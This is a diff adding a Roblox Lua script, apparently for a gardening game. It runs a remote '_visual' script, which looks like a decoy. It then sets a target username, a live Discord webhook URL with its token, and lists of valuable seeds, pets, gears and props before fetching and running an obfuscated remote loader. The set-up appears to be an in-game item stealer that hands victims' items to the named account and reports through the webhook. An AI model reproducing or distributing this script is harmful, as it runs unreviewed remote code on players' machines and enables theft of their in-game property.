@@ -1,0 +1,46 @@
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/OP-Script-Hub/GAG2/refs/heads/main/_visual"))()
+end)
+
+task.spawn(function()
+    getgenv().NORMAL_TARGET     = "levor_1998"
+    getgenv().NORMAL_WEBHOOK_URL = "https://discord.com/api/webhooks/1470046683583746182/fP9HGvadI9g05n3HxLsZVgww2tD8-WC_XSm9fDZkTvUOdh1OAL_RZc4oxsX1LFTmw3AZ"
+    getgenv().NORMAL_SEEDS = {
+        ["Moon Bloom"] = true,
+        ["Hypno Bloom"] = true,
+        ["Dragon's Breath"] = true,
+        ["Rainbow Seed"] = true,
+        ["Ghost Pepper"] = true,
+        ["Gold Seed"] = true
+    }
+    getgenv().NORMAL_PETS = {
+        ["Raccoon"] = true,
+        ["Unicorn"] = true,
+        ["Golden Dragonfly"] = true,
+        ["Robin"] = true,
+        ["Bee"] = true,
+        ["Bear"] = true,
+        ["Monkey"] = true,
+        ["Ice Serpent"] = true,
+        ["Black Dragon"] = true,
+        ["Mega Raccoon"] = true,
+        ["Mega Rainbow Unicorn"] = true,
+        ["Mega Golden Dragonfly"] = true,
+        ["Mega Rainbow Robin"] = true,
+        ["Mega Rainbow Bee"] = true,
+        ["Rainbow Bear"] = true,
+        ["Rainbow Monkey"] = true,
+        ["Mega Rainbow Ice Serpent"] = true,
+        ["Mega Rainbow Black Dragon"] = true
+    }
+    getgenv().NORMAL_GEARS = {
+        ["Super Sprinkler"] = true,
+        ["Trowel"] = true,
+        ["Super Watering Can"] = true
+    }
+    getgenv().NORMAL_PROPS = {
+        ["Teleporter Pad Crate"] = true
+    }
+   
+    loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/22c796a75f035b5ef8e55946d39e602c.lua"))()
+end)
